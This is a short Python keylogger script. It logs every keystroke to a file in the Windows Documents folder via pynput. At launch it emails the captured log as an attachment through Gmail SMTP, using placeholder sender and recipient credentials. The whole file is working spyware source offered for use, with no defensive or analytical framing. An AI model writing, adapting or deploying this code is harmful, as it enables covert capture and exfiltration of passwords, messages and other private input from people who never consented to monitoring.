import time
from pathlib import Path
import getpass
#Email
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
#Keylogger
from pynput.keyboard import Key, Listener
import logging

###################################################################

fileSavePath = "C:/Users/{0}/Documents/".format(getpass.getuser())
textFileName = "keylog.txt"
sendAddrs = "your_email"
sendPass = "your_pass"
recieveAddrs = "other_email"

###################################################################


if __name__ == "__main__":
    if Path(fileSavePath + textFileName).exists:
        msg = MIMEMultipart()
        msg['From'] = sendAddrs
        msg['To'] = recieveAddrs
        msg['Subject'] = 'pytest'
        body = 'text'
        msg.attach(MIMEText(body,'plain'))
        attachment = open(fileSavePath + textFileName,'rb')
        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment;filename= " + fileSavePath + textFileName)
        msg.attach(part)
        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(sendAddrs, sendPass)
        server.sendmail(sendAddrs, recieveAddrs, text)
        server.quit()
           
    log_dir = "C:/Users/{0}/Documents/".format(getpass.getuser())

    logging.basicConfig(filename=(log_dir + 'keylog.txt'), filemode='w', level=logging.DEBUG, format='%(message)s')

    def on_press(key):
        try: logging.info(key.char) # letters, numbers etc
        except: logging.info(key.name) # other keys

    with Listener(on_press=on_press) as listener:
        listener.join()
